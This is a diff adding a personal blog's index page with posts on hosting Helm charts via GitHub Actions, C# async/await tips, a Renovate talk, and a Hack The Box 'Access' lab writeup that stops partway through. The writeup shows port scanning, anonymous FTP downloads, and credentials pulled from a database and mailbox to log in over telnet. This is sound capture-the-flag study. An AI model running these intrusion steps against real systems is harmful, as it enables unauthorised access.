@@ -1,0 +1,303 @@
+<!doctype html><html xmlns=http://www.w3.org/1999/xhtml xml:lang=en lang=en-us><head><meta name=generator content="Hugo 0.83.1"><link href=http://gmpg.org/xfn/11 rel=profile><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1,maximum-scale=1"><title>Jamie Magee &#183; Jamie Magee</title><link rel=stylesheet href=/css/poole.css><link rel=stylesheet href=/css/hyde.css><link rel=stylesheet href=/css/poole-overrides.css><link rel=stylesheet href=/css/hyde-overrides.css><link rel=stylesheet href=/css/hyde-x.css><link rel=stylesheet href=/css/highlight/github.css><link rel=stylesheet href="https://fonts.googleapis.com/css?family=PT+Sans:400,400italic,700|Abril+Fatface"><link rel=stylesheet href=//maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css><link rel=stylesheet href=/css/jamie.css><link rel=apple-touch-icon-precomposed sizes=144x144 href=/touch-icon-144-precomposed.png><link href=/favicon.ico rel=icon><link href=%7balternate%20%7bRSS%20application/rss+xml%20%20index%20alternate%20%20false%20false%20true%20false%20false%200%7d%20/index.xml%20/index.xml%7d rel=alternate type=application/rss+xml title="Jamie Magee &#183; Jamie Magee"><meta name=description content><meta name=keywords content><meta property="og:title" content="Jamie Magee"><meta property="og:description" content><meta property="og:type" content="website"><meta property="og:url" content="/"><meta name=twitter:card content="summary"><meta name=twitter:title content="Jamie Magee"><meta name=twitter:description content><script type=application/javascript>var doNotTrack=!1;doNotTrack||(window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)},ga.l=+new Date,ga('create','UA-701081-9','auto'),ga('send','pageview'))</script><script async src=https://www.google-analytics.com/analytics.js></script><script src=https://identity.netlify.com/v1/netlify-identity-widget.js></script></head><body class=theme-base-0c><div class=sidebar><div class="container sidebar-sticky"><div class=sidebar-about><div class=sidebar-head><img src="https://www.gravatar.com/avatar/5a37e2531db08529192d7d323e8cecd8?s=200" alt=gravatar title="Jamie Magee"><h1><a href=/>Jamie Magee</a></h1></div><p class=lead>Programmer, Engineer, Problem Solver</p></div><ul class=sidebar-nav><li class=sidebar-nav-item><a href=/>Home</a></li><li class=sidebar-nav-item><a href=/about>About</a></li><li class=sidebar-nav-item><a href=/blog>Archive</a></li></ul><ul class=sidebar-nav><li class=sidebar-nav-item><a href=https://github.com/JamieMagee><i class="fa fa-github-square fa-3x"></i></a>
+<a href=https://www.linkedin.com/in/jamiemagee1/><i class="fa fa-linkedin-square fa-3x"></i></a>
+<a href=http://twitter.com/Jamie_Magee><i class="fa fa-twitter-square fa-3x"></i></a></li></ul><p>&copy; 2021. <a href=https://creativecommons.org/licenses/by-nc/4.0/>CC BY-NC 4.0</a></p></div></div><div class="content container"><div class=posts><div class=post><h1 class=post-title><a href=/blog/how-to-host-your-helm-chart-repository-on-github/>How to host your Helm chart repository on GitHub</a></h1><span class=post-date>Apr 2, 2020 &#183; 6 minute read &#183; <a href=/blog/how-to-host-your-helm-chart-repository-on-github/#disqus_thread>Comments</a></span><p>Since the release of Helm 3, the official <a href=https://github.com/helm/charts>helm/charts</a> repository has been deprecated in favour of <a href=https://hub.helm.sh/>Helm Hub</a>. While it&rsquo;s great for decentralization and the long term sustainability of the project, I think there&rsquo;s a lot more that is lost. Where is the best place to go for of the expert advice now? Installing Helm now requires you to manually add each repository you use. And there&rsquo;s now some added friction to hosting your Helm charts.</p><p>Thankfully GitHub has all the tools required, in the form of <a href=https://pages.github.com/>GitHub Pages</a> and <a href=https://github.com/features/actions>GitHub Actions</a>, to host a fully automated build pipeline and to host a repository for your Helm charts. Also, we can use some of the tools from the community to ensure our charts are high quality.</p><h2 id=github-pages>GitHub Pages</h2><p>First you need to go ahead and create a <code>gh-pages</code> branch in your repository. As I&rsquo;m writing this there&rsquo;s <a href=https://github.com/helm/chart-releaser-action/issues/10>an issue</a> open to do this automatically, but to do it manually you can run the following:</p><pre><code>git checkout --orphan gh-pages
+git rm -rf .
+git commit -m &quot;Initial commit&quot; --allow-empty
+git push
+</code></pre><p>Once you&rsquo;ve done that, you need to enable GitHub Pages in your repository. Go to the settings page on your repository and set the source branch to the <code>gh-pages</code> branch you just created.</p><p><img src=/img/github-pages.png alt="GitHub Pages"></p><p>Now you&rsquo;ve configured GitHub Pages, it will act as your Helm repository. Next, you need to configure GitHub Actions to publish to there.</p><h2 id=github-actions>GitHub Actions</h2><p>You&rsquo;re going to use GitHub Actions to create two workflows: one for pull requests, and one for commits to master. Your pull request workflow will deal with linting and testing your chart using a collection of automated tooling. While this isn&rsquo;t a direct replacement for the expert advice offered by the Helm community, it&rsquo;s better than nothing. Your master branch workflow will deal with releasing your charts using GitHub pages, meaning you never have to do it manually.</p><p>First up let&rsquo;s look at the pull request workflow.</p><h2 id=pull-requests>Pull requests</h2><p>For each pull request in your chart repository, you want to run a series of different validation and linting tools to catch any avoidable mistakes in your Helm charts. To do that, go ahead and create a workflow in your repository by creating a file at <code>.github/workflows/ci.yaml</code> and add the following YAML to it:</p><script type=application/javascript src="https://gist.github.com/JamieMagee/8d35ee8114383217c44ab79959b0a7c5.js?file=workflow.yaml"></script><p>This will run the workflow on any pull request that changes files under the charts directory.</p><p>That&rsquo;s the skeleton of the workflow sorted, next onto the tools that you&rsquo;re going to use.</p><h3 id=chart-testing>Chart Testing</h3><p>The Helm project created Chart Testing, AKA <code>ct</code>, as a comprehensive linting tool for Helm charts. To use it in your pull request build, you&rsquo;ll go ahead and add the following job:</p><script type=application/javascript src="https://gist.github.com/JamieMagee/8d35ee8114383217c44ab79959b0a7c5.js?file=lint-charts.yaml"></script><p>Where <code>ct.yaml</code> is:</p><script type=application/javascript src="https://gist.github.com/JamieMagee/8d35ee8114383217c44ab79959b0a7c5.js?file=ct.yaml"></script><p>For a full list of configuration options check out this <a href=https://github.com/helm/chart-testing/blob/master/pkg/config/test_config.yaml>sample file</a>.</p><p>The <code>lint</code> action for Chart Testing is a bit of a catch-all that helps you prevent a lot of potential bugs or mistakes in your charts. That includes:</p><ul><li>Version checking</li><li>YAML schema validation on <code>Chart.yaml</code></li><li>YAML linting on <code>Chart.yaml</code> and <code>values.yaml</code></li><li>Maintainer validation on changed charts</li></ul><h3 id=helm-docs>Helm-docs</h3><p>Helm-docs isn&rsquo;t strictly a linting tool, but it makes sure that your documentation stays up-to-date with the current state of your chart. It requires that you create a <code>README.md.gotmpl</code> in each chart repository using the <a href=https://github.com/norwoodj/helm-docs#available-templates>available templates</a>, otherwise it will create a <code>README.md</code> for you using a default template.</p><p>To use it as part of your pull request build, you need to add the following job:</p><script type=application/javascript src="https://gist.github.com/JamieMagee/8d35ee8114383217c44ab79959b0a7c5.js?file=lint-docs.yaml"></script><p>Where <a href=http://helm-docs.sh><code>helm-docs.sh</code></a> is:</p><script type=application/javascript src="https://gist.github.com/JamieMagee/8d35ee8114383217c44ab79959b0a7c5.js?file=helm-docs.sh"></script><p>This runs Helm-docs against each chart in your repository and generates the <code>README.md</code> for each one. Then, using git, you&rsquo;ll fail the build if there are any differences. This ensures that you can&rsquo;t check in any changes to your charts without also updating the documentation.</p><h3 id=kubeval>Kubeval</h3><p>Next up is Kubeval. It validates the output from Helm against schemas generated from the Kubernetes OpenAPI specification. You&rsquo;re going to add it to your pull request, and use it to validate across multiple different versions of Kubernetes. Add the following job:</p><script type=application/javascript src="https://gist.github.com/JamieMagee/8d35ee8114383217c44ab79959b0a7c5.js?file=kubeval-chart.yaml"></script><p>Where <a href=http://kubeval.sh><code>kubeval.sh</code></a> is:</p><script type=application/javascript src="https://gist.github.com/JamieMagee/8d35ee8114383217c44ab79959b0a7c5.js?file=kubeval.sh"></script><p>This script is a bit longer, but if you break it down step-by-step it&rsquo;s essentially:</p><ol><li>Get a list of charts that have been changed between this PR and master branch</li><li>Install Kubeval</li><li>For each chart:<ol><li>Generate the Kubernetes configuration using Helm</li><li>Validatate the configuration using Kubeval</li></ol></li></ol><p>You&rsquo;re doing this for each version of Kubernetes you&rsquo;ve defined in the job, so if you&rsquo;re using an API that isn&rsquo;t available in all versions, Kubeval will fail the build. This help keep backwards compatibility for all of your charts, and makes sure you&rsquo;re not releasing breaking changes accidentally.</p><p>This doesn&rsquo;t guarantee that the chart will actually install successfully on Kubernetes—but that&rsquo;s where Kubernetes in Docker comes in.</p><h3 id=kubernetes-in-docker-kind>Kubernetes in Docker (KIND)</h3><p>Finally you&rsquo;re going to use Chart Testing again to install your Helm charts on a Kubernetes cluster running in the GitHub Actions runner using Kubernetes in Docker (KIND). Like Kubeval, you can create clusters for different versions of Kubernetes.</p><p>KIND doesn&rsquo;t publish Docker images for each version of Kubernetes, so you need to look at the Docker <a href=https://hub.docker.com/r/kindest/node/tags>image tags</a>. That&rsquo;s why the Kubernetes versions in this job won&rsquo;t necessarily match the versions used for the Kubeval job.</p><script type=application/javascript src="https://gist.github.com/JamieMagee/8d35ee8114383217c44ab79959b0a7c5.js?file=install-chart.yaml"></script><p>So you got a temporary Kubernetes cluster, installed your charts on it, and ran any <a href=https://helm.sh/docs/topics/chart_tests/>helm tests</a> (that you definitely wrote 🙄). This is the ultimate test of your Helm chart—installing and running it. If this passes, and you merge your pull request, you&rsquo;re ready to release!</p><h2 id=releasing>Releasing</h2><p>Remember that <code>gh-pages</code> branch you created earlier? Now you can use it to publish your fully tested Helm chart to.</p><p>You&rsquo;re going to create another GitHub workflow, this time at <code>.github/workflows/release.yaml</code>. This one is going to be significantly simpler:</p><script type=application/javascript src="https://gist.github.com/JamieMagee/8d35ee8114383217c44ab79959b0a7c5.js?file=release.yaml"></script><p>It will check out the repository, set the configuration of Git to the user that kicked-off the workflow, and run the chart releaser action. The chart releaser action will package the chart, create a release from it, and update the <code>index.yaml</code> file in the <code>gh-pages</code> branch. Simple!</p><p>But one thing you still need to do is create a secret in your repository, <code>CR_TOKEN</code>, which contains a GitHub <a href=https://help.github.com/en/github/authenticating-to-github/creating-a-personal-access-token-for-the-command-line#creating-a-token>personal access token</a> with <code>repo</code> scope. This is due to a <a href=https://github.community/t5/GitHub-Actions/Github-action-not-triggering-gh-pages-upon-push/m-p/31266/highlight/true#M743>GitHub Actions bug</a>, where GitHub Pages is not deployed when pushing from GitHub Actions.</p><p><img src=/img/github-secrets.png alt="GitHub Secrets"></p><p>Once that&rsquo;s all configured, any time a change under the charts directory is checked in, like from a pull request, your Github workflow will run and your charts will be available almost instantly!</p><h2 id=next-steps>Next steps</h2><p>From here you&rsquo;ll want to add your repository to Helm so you can use it, and share it on <a href=https://hub.helm.sh/>Helm Hub</a> so others can too. For the former, you&rsquo;ll need to run:</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>helm repo add renovate https://&lt;username&gt;.github.io/&lt;repository&gt;/
+helm repo update
+</code></pre></div><p>And for the latter, the Helm project have written <a href=https://github.com/helm/hub/blob/master/Repositories.md>a comprehensive guide</a> that I couldn&rsquo;t possibly top.</p><p>If you want to see all these pieces working together checkout the <a href=https://github.com/renovatebot/helm-charts>renovatebot/helm-charts</a> repository, or our page on <a href=https://hub.helm.sh/charts/renovate/renovate>Helm Hub</a>. And if you would like some help please reach out to me on Twitter at <a href=https://twitter.com/Jamie_Magee>@Jamie_Magee</a>.</p></div><div class=post><h1 class=post-title><a href=/blog/7-tips-for-converting-csharp-code-to-async-await/>7 tips for converting C# code to async/await</a></h1><span class=post-date>Mar 16, 2020 &#183; 2 minute read &#183; <a href=/blog/7-tips-for-converting-csharp-code-to-async-await/#disqus_thread>Comments</a></span><p>Over the past year I&rsquo;ve moved from working mainly in Java, to working mainly in C#. To be honest, Java and C# have more in common than not, but one of the major differences is async/await. It&rsquo;s a really powerful tool if used correctly, but also a very quick way to shoot yourself in the foot.</p><p>Asynchronous programming looks very similar to synchronous programming. However, there are some core concepts which need to be understood in order to form a proper mental model when converting between synchronous and asynchronous programming patterns.</p><p>Here are some of the most common ones I&rsquo;ve come across.</p><h2 id=naming>Naming</h2><p>Method names must use the suffix Async when returning a <code>Task</code> or <code>Task&lt;T></code>. Consistency is key as the <code>Async</code> suffix provides not only a mental signal to the caller that the await keyword should be used, but also provides a consistent naming convention.</p><script type=application/javascript src="https://gist.github.com/JamieMagee/40c8eb76e430c4803ffd225a22ccb0ad.js?file=Naming.cs"></script><h2 id=return-types>Return types</h2><p>Every async method returns a <code>Task</code>. Use <code>Task</code> when there is no specific result for the method, which is synonymous with <code>void</code>. Use <code>Task&lt;T></code> when a return value is required.</p><script type=application/javascript src="https://gist.github.com/JamieMagee/40c8eb76e430c4803ffd225a22ccb0ad.js?file=ReturnTypes.cs"></script><h2 id=parameters>Parameters</h2><p>There is not a way for the compiler to manage <code>ref</code> and <code>out</code> parameters. (That&rsquo;s a topic for another time.) When multiple values need to be returned you should either use custom objects or a <code>Tuple</code>.</p><script type=application/javascript src="https://gist.github.com/JamieMagee/40c8eb76e430c4803ffd225a22ccb0ad.js?file=Parameters.cs"></script><h2 id=delegates>Delegates</h2><p>Following up on the lack of the <code>void</code> return type, no async method should be defined as an <code>Action</code> variant. When accepting a delegate to an asynchronous method, the asynchronous pattern should be propagated by accepting <code>Func&lt;Task></code> or <code>Func&lt;Task&lt;T>></code>.</p><script type=application/javascript src="https://gist.github.com/JamieMagee/40c8eb76e430c4803ffd225a22ccb0ad.js?file=Delegates.cs"></script><h2 id=virtual-methods>Virtual methods</h2><p>In asynchronous programming there is no concept of a <code>void</code> return type, as the basis of the model is that each method returns a mechanism for signalling completion of the asynchronous work. When converting base classes which have empty implementations or return constant values, the framework provides methods and helpers to facilitate the pattern.</p><script type=application/javascript src="https://gist.github.com/JamieMagee/40c8eb76e430c4803ffd225a22ccb0ad.js?file=VirtualMethods.cs"></script><h2 id=interfaces>Interfaces</h2><p>Like delegates, interfaces should always be declared async which ensures an async-aware model throughout the stack.</p><script type=application/javascript src="https://gist.github.com/JamieMagee/40c8eb76e430c4803ffd225a22ccb0ad.js?file=Interfaces.cs"></script><h2 id=mocks>Mocks</h2><p>In certain cases, mostly unit test mocks, you may find the need to implement interfaces without having any reason to actually perform any asynchronous calls. In these specific cases it is OK to feign asynchronous execution using <code>Task.CompletedTask</code> or <code>Task.FromResult&lt;T>(T result)</code>.</p><script type=application/javascript src="https://gist.github.com/JamieMagee/40c8eb76e430c4803ffd225a22ccb0ad.js?file=Mocks.cs"></script><h2 id=summary>Summary</h2><p>Overall asynchronous programming is much better for performance, but requires a slightly different mental model. I hope these tips help!</p></div><div class=post><h1 class=post-title><a href=/blog/automated-dependency-updates/>Automated Dependency Updates</a></h1><span class=post-date>Oct 23, 2019 &#183; 1 minute read &#183; <a href=/blog/automated-dependency-updates/#disqus_thread>Comments</a></span><p>At <a href=https://copenhagenjs.dk>CopenhagenJS</a> in August I was able to share my work on <a href=https://renovatebot.com/>Renovate</a>—a universal dependency update tool—and how you can use it to save time and improve security in software projects.</p><p>If you want to find out more about Renovate you can find us <a href=https://github.com/renovatebot/renovate>on GitHub</a>.</p><style>.embed-container{position:relative;padding-bottom:56.25%;height:0;overflow:hidden;max-width:100%}.embed-container iframe,.embed-container object,.embed-container embed{position:absolute;top:0;left:0;width:100%;height:100%}</style><div class=embed-container><iframe src=https://www.youtube.com/embed/yAntIlemF28 frameborder=0 allowfullscreen></iframe></div></div><div class=post><h1 class=post-title><a href=/blog/access-htb-writeup/>Access: Hack The Box writeup</a></h1><span class=post-date>Mar 2, 2019 &#183; 8 minute read &#183; <a href=/blog/access-htb-writeup/#disqus_thread>Comments</a></span><p><a href=https://www.hackthebox.eu/home/machines/profile/156><img src=/img/access-info.png alt="Access info page"></a></p><p>Recently I discovered <a href=https://www.hackthebox.eu/home>Hack The Box</a>, an online platform to hone your cyber security skills by practising on vulnerable VMs. The first box I solved is called <a href=https://www.hackthebox.eu/home/machines/profile/156>Access</a>. In this blog post I&rsquo;ll walk through how I solved it. If you don&rsquo;t want any spoilers, look away now!</p><h2 id=information-gathering>Information gathering</h2><p>Let&rsquo;s start with an <code>nmap</code> scan to see what services are running on the box.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=color:#75715e># nmap -n -v -Pn -p- -A --reason -oN nmap.txt 10.10.10.98</span>
+...
+PORT   STATE SERVICE REASON  VERSION
+21/tcp open  ftp     syn-ack Microsoft ftpd
+| ftp-anon: Anonymous FTP login allowed <span style=color:#f92672>(</span>FTP code 230<span style=color:#f92672>)</span>
+|_Can<span style=color:#960050;background-color:#1e0010>&#39;</span>t get directory listing: TIMEOUT
+| ftp-syst:
+|_  SYST: Windows_NT
+23/tcp open  telnet  syn-ack Microsoft Windows XP telnetd <span style=color:#f92672>(</span>no more connections allowed<span style=color:#f92672>)</span>
+80/tcp open  http    syn-ack Microsoft IIS httpd 7.5
+| http-methods:
+|   Supported Methods: OPTIONS TRACE GET HEAD POST
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/7.5
+|_http-title: MegaCorp
+</code></pre></div><p><code>nmap</code> has found three services running: FTP, telnet, and an HTTP server. Let&rsquo;s see what&rsquo;s running on the HTTP server.</p><p><img src=/img/htb-access-http.png alt></p><p>It&rsquo;s just a static page, showing an image. Nothing interesting, so let&rsquo;s move on for now.</p><h2 id=anonymous-ftp>Anonymous FTP</h2><p><code>nmap</code> showed that there is an FTP server running, with anonymous login allowed. Let&rsquo;s see what&rsquo;s on that server</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=color:#75715e># ftp 10.10.10.98</span>
+Connected to 10.10.10.98.
+<span style=color:#ae81ff>220</span> Microsoft FTP Service
+Name <span style=color:#f92672>(</span>10.10.10.98:root<span style=color:#f92672>)</span>: anonymous
+<span style=color:#ae81ff>331</span> Anonymous access allowed, send identity <span style=color:#f92672>(</span>e-mail name<span style=color:#f92672>)</span> as password.
+Password:
+<span style=color:#ae81ff>230</span> User logged in.
+Remote system type is Windows_NT.
+ftp&gt; ls
+<span style=color:#ae81ff>200</span> PORT command successful.
+<span style=color:#ae81ff>125</span> Data connection already open; Transfer starting.
+08-23-18  08:16PM       &lt;DIR&gt;          Backups
+08-24-18  09:00PM       &lt;DIR&gt;          Engineer
+<span style=color:#ae81ff>226</span> Transfer complete.
+ftp&gt; ls Backups
+<span style=color:#ae81ff>200</span> PORT command successful.
+<span style=color:#ae81ff>125</span> Data connection already open; Transfer starting.
+08-23-18  08:16PM              <span style=color:#ae81ff>5652480</span> backup.mdb
+<span style=color:#ae81ff>226</span> Transfer complete.
+ftp&gt; ls Engineer
+<span style=color:#ae81ff>200</span> PORT command successful.
+<span style=color:#ae81ff>125</span> Data connection already open; Transfer starting.
+08-24-18  12:16AM                <span style=color:#ae81ff>10870</span> Access Control.zip
+<span style=color:#ae81ff>226</span> Transfer complete.
+</code></pre></div><p>There are some interesting files here, let&rsquo;s download them and analyse them</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=color:#75715e># wget ftp://anonymous:anonymous@10.10.10.98 --no-passive-ftp --mirror</span>
+--2019-02-02 15:37:26--  ftp://anonymous:*password*@10.10.10.98/
+           <span style=color:#f92672>=</span>&gt; ‘10.10.10.98/.listing’
+Connecting to 10.10.10.98:21... connected.
+Logging in as anonymous ... Logged in!
+...
+FINISHED --2019-02-02 15:37:28--
+Total wall clock time: 1.8s
+Downloaded: <span style=color:#ae81ff>5</span> files, 5.4M in 1.4s <span style=color:#f92672>(</span>3.99 MB/s<span style=color:#f92672>)</span>
+</code></pre></div><h2 id=microsoft-access>Microsoft Access</h2><p>We&rsquo;ve got a <code>.mdb</code> file—which is a Microsoft Access database file—and a zip file. If we take a quick look at the zip file it&rsquo;s password protected. We&rsquo;ll have to come back the that later.</p><p>We can examine <code>backup.mdb</code> using MDB tools. Maybe there&rsquo;s something we can use there.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=color:#75715e># mdb-tables Backups/backup.mdb</span>
+acc_antiback acc_door acc_firstopen acc_firstopen_emp acc_holidays acc_interlock acc_levelset acc_levelset_door_group acc_linkageio acc_map acc_mapdoorpos acc_morecardempgroup acc_morecardgroup acc_timeseg acc_wiegandfmt ACGroup acholiday ACTimeZones action_log AlarmLog areaadmin att_attreport att_waitforprocessdata attcalclog attexception AuditedExc auth_group_permissions auth_message auth_permission auth_user auth_user_groups auth_user_user_permissions base_additiondata base_appoption base_basecode base_datatranslation base_operatortemplate base_personaloption base_strresource base_strtranslation base_systemoption CHECKEXACT CHECKINOUT dbbackuplog DEPARTMENTS deptadmin DeptUsedSchs devcmds devcmds_bak django_content_type django_session EmOpLog empitemdefine EXCNOTES FaceTemp iclock_dstime iclock_oplog iclock_testdata iclock_testdata_admin_area iclock_testdata_admin_dept LeaveClass LeaveClass1 Machines NUM_RUN NUM_RUN_DEIL operatecmds personnel_area personnel_cardtype personnel_empchange personnel_leavelog ReportItem SchClass SECURITYDETAILS ServerLog SHIFT TBKEY TBSMSALLOT TBSMSINFO TEMPLATE USER_OF_RUN USER_SPEDAY UserACMachines UserACPrivilege USERINFO userinfo_attarea UsersMachines UserUpdates worktable_groupmsg worktable_instantmsg worktable_msgtype worktable_usrmsg ZKAttendanceMonthStatistics acc_levelset_emp acc_morecardset ACUnlockComb AttParam auth_group AUTHDEVICE base_option dbapp_viewmodel FingerVein devlog HOLIDAYS personnel_issuecard SystemLog USER_TEMP_SCH UserUsedSClasses acc_monitor_log OfflinePermitGroups OfflinePermitUsers OfflinePermitDoors LossCard TmpPermitGroups TmpPermitUsers TmpPermitDoors ParamSet acc_reader acc_auxiliary STD_WiegandFmt CustomReport ReportField BioTemplate FaceTempEx FingerVeinEx TEMPLATEEx
+</code></pre></div><p>It looks like there&rsquo;s a lot of autogenerated tables here, but those <code>auth_*</code> tables look interesting.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=color:#75715e># mdb-export Backups/backup.mdb auth_user</span>
+id,username,password,Status,last_login,RoleID,Remark
+25,<span style=color:#e6db74>&#34;admin&#34;</span>,<span style=color:#e6db74>&#34;admin&#34;</span>,1,<span style=color:#e6db74>&#34;08/23/18 21:11:47&#34;</span>,26,
+27,<span style=color:#e6db74>&#34;engineer&#34;</span>,<span style=color:#e6db74>&#34;access4u@security&#34;</span>,1,<span style=color:#e6db74>&#34;08/23/18 21:13:36&#34;</span>,26,
+28,<span style=color:#e6db74>&#34;backup_admin&#34;</span>,<span style=color:#e6db74>&#34;admin&#34;</span>,1,<span style=color:#e6db74>&#34;08/23/18 21:14:02&#34;</span>,26,
+</code></pre></div><p>Awesome! So we&rsquo;ve got some credentials for <code>engineer</code>, and we&rsquo;ve got a password protected zip file in the <code>Engineer</code> directory.</p><h2 id=microsoft-outlook>Microsoft Outlook</h2><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=color:#75715e># 7z x Access\ Control.zip</span>
+
+7-Zip <span style=color:#f92672>[</span>64<span style=color:#f92672>]</span> 16.02 : Copyright <span style=color:#f92672>(</span>c<span style=color:#f92672>)</span> 1999-2016 Igor Pavlov : 2016-05-21
+p7zip Version 16.02 <span style=color:#f92672>(</span>locale<span style=color:#f92672>=</span>en_GB.UTF-8,Utf16<span style=color:#f92672>=</span>on,HugeFiles<span style=color:#f92672>=</span>on,64 bits,2 CPUs Intel<span style=color:#f92672>(</span>R<span style=color:#f92672>)</span> Core<span style=color:#f92672>(</span>TM<span style=color:#f92672>)</span> i7-7820HQ CPU @ 2.90GHz <span style=color:#f92672>(</span>906E9<span style=color:#f92672>)</span>,ASM,AES-NI<span style=color:#f92672>)</span>
+
+Scanning the drive <span style=color:#66d9ef>for</span> archives:
+<span style=color:#ae81ff>1</span> file, <span style=color:#ae81ff>10870</span> bytes <span style=color:#f92672>(</span><span style=color:#ae81ff>11</span> KiB<span style=color:#f92672>)</span>
+
+Extracting archive: Access Control.zip
+--
+Path <span style=color:#f92672>=</span> Access Control.zip
+Type <span style=color:#f92672>=</span> zip
+Physical Size <span style=color:#f92672>=</span> <span style=color:#ae81ff>10870</span>
+
+
+Enter password <span style=color:#f92672>(</span>will not be echoed<span style=color:#f92672>)</span>:
+Everything is Ok
+
+Size:       <span style=color:#ae81ff>271360</span>
+Compressed: <span style=color:#ae81ff>10870</span>
+
+<span style=color:#75715e># ls</span>
+<span style=color:#e6db74>&#39;Access Control.pst&#39;</span>  <span style=color:#e6db74>&#39;Access Control.zip&#39;</span>
+</code></pre></div><p>That worked! Now we&rsquo;ve got the mailbox backup for the engineer, but we first need to convert it to something that we can read more easily on Linux.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=color:#75715e># readpst Access\ Control.pst</span>
+Opening PST file and indexes...
+Processing Folder <span style=color:#e6db74>&#34;Deleted Items&#34;</span>
+	<span style=color:#e6db74>&#34;Access Control&#34;</span> - <span style=color:#ae81ff>2</span> items <span style=color:#66d9ef>done</span>, <span style=color:#ae81ff>0</span> items skipped.
+</code></pre></div><p>Let&rsquo;s take a peek at the engineer&rsquo;s mailbox</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=color:#75715e># mail -f Access\ Control.mbox</span>
+mail version v14.9.11.  Type <span style=color:#e6db74>`</span>?<span style=color:#e6db74>&#39; for help
+</span><span style=color:#e6db74>&#39;</span>/root/10.10.10.98/Engineer/Access Control.mbox<span style=color:#e6db74>&#39;: 1 message
+</span><span style=color:#e6db74>▸O  1 john@megacorp.com  2018-08-23 23:44   87/3112  MegaCorp Access Control System &#34;security&#34; account
+</span><span style=color:#e6db74>?
+</span><span style=color:#e6db74>[-- Message  1 -- 87 lines, 3112 bytes --]:
+</span><span style=color:#e6db74>From &#34;john@megacorp.com&#34; Thu Aug 23 23:44:07 2018
+</span><span style=color:#e6db74>From: john@megacorp.com &lt;john@megacorp.com&gt;
+</span><span style=color:#e6db74>Subject: MegaCorp Access Control System &#34;security&#34; account
+</span><span style=color:#e6db74>To: &#39;</span>security@accesscontrolsystems.com<span style=color:#960050;background-color:#1e0010>&#39;</span>
+Date: Thu, <span style=color:#ae81ff>23</span> Aug <span style=color:#ae81ff>2018</span> 23:44:07 +0000
+
+<span style=color:#f92672>[</span>-- <span style=color:#75715e>#1.1 73/2670 multipart/alternative --]</span>
+
+
+
+<span style=color:#f92672>[</span>-- <span style=color:#75715e>#1.1.1 15/211 text/plain, 7bit, utf-8 --]</span>
+
+Hi there,
+
+
+
+The password <span style=color:#66d9ef>for</span> the “security” account has been changed to 4Cc3ssC0ntr0ller.  Please ensure this is pass
+ed on to your engineers.
+
+
+
+Regards,
+
+John
+
+
+
+<span style=color:#f92672>[</span>-- <span style=color:#75715e>#1.1.2 51/2211 text/html, 7bit, us-ascii --]</span>
+?
+</code></pre></div><p>Another set of credentials! I wonder what these are used for? Let&rsquo;s try FTP first</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=color:#75715e># ftp 10.10.10.98</span>
+Connected to 10.10.10.98.
+<span style=color:#ae81ff>220</span> Microsoft FTP Service
+Name <span style=color:#f92672>(</span>10.10.10.98:jamie<span style=color:#f92672>)</span>: security
+<span style=color:#ae81ff>331</span> Password required <span style=color:#66d9ef>for</span> security.
+Password:
+<span style=color:#ae81ff>530</span> User cannot log in.
+ftp: Login failed.
+</code></pre></div><p>No dice ☹. The only other option is <code>telnet</code>.</p><h2 id=telnet>Telnet</h2><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=color:#75715e># telnet 10.10.10.98</span>
+Trying 10.10.10.98...
+Connected to 10.10.10.98.
+Escape character is <span style=color:#e6db74>&#39;^]&#39;</span>.
+Welcome to Microsoft Telnet Service
+
+login: security
+password:
+
+*<span style=color:#f92672>===============================================================</span>
+Microsoft Telnet Server.
+*<span style=color:#f92672>===============================================================</span>
+C:<span style=color:#ae81ff>\U</span>sers<span style=color:#ae81ff>\s</span>ecurity&gt;
+</code></pre></div><p>We&rsquo;re in! The <code>user.txt</code> should be located on <code>security</code>&rsquo;s Desktop</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-posh data-lang=posh>C:\Users\security&gt;dir
+ Volume <span style=color:#66d9ef>in</span> drive C has no label.
+ Volume Serial Number is 9C45-DBF0
+
+ Directory of C:\Users\security
+
+02/02/2019  03<span style=color:#960050;background-color:#1e0010>:</span>56 PM    &lt;DIR&gt;          .
+02/02/2019  03<span style=color:#960050;background-color:#1e0010>:</span>56 PM    &lt;DIR&gt;          ..
+08/24/2018  07<span style=color:#960050;background-color:#1e0010>:</span>37 PM    &lt;DIR&gt;          .yawcam
+08/21/2018  10<span style=color:#960050;background-color:#1e0010>:</span>35 PM    &lt;DIR&gt;          Contacts
+08/28/2018  06<span style=color:#960050;background-color:#1e0010>:</span>51 AM    &lt;DIR&gt;          Desktop
+08/21/2018  10<span style=color:#960050;background-color:#1e0010>:</span>35 PM    &lt;DIR&gt;          Documents
